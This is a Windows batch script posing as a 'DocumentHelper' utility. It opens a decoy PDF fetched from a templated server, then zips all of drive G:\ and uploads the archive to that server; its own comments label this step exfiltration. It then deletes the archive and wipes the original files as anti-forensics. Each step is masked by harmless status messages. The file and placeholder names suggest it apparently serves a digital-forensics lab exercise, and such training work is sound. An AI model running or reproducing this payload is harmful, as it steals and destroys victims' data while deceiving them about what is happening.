@echo off
echo [*] Initializing DocumentHelper utility...

:: Step 1: Download and launch decoy PDF
echo [*] Fetching reference documentation...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/download/DF-Lab1.pdf' -OutFile '%~dp0DF-Lab1.pdf' -UseBasicParsing"
powershell -NoProfile -Command "Start-Process -FilePath '%~dp0DF-Lab1.pdf'"

echo [*] Processing files in background...
powershell -NoProfile -Command "Start-Sleep -Seconds 10"

:: Step 2: Compress sensitive files on data drive G:\ into staging archive
echo [*] Archiving data...
powershell -NoProfile -Command "Get-ChildItem -Path 'G:\' -Exclude '$RECYCLE.BIN','System Volume Information','phoenix_staging.zip','Sysmon' | Compress-Archive -DestinationPath 'G:\phoenix_staging.zip' -Force -ErrorAction SilentlyContinue"

:: Step 3: Exfiltrate staging archive to Phoenix Server
echo [*] Synchronizing with server...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/uploaded/phoenix_staging.zip' -Method POST -InFile 'G:\phoenix_staging.zip' -ContentType 'application/octet-stream' -UseBasicParsing"

:: Step 4: Anti-forensics - Delete staging zip and wipe original files from G:\
echo [*] Cleaning temporary workspace...
powershell -NoProfile -Command "Remove-Item -Path 'G:\phoenix_staging.zip' -Force -ErrorAction SilentlyContinue"
powershell -NoProfile -Command "Get-ChildItem -Path 'G:\*' -Exclude '$RECYCLE.BIN','System Volume Information','Sysmon' | Remove-Item -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue"

echo [✓] DocumentHelper optimization complete.

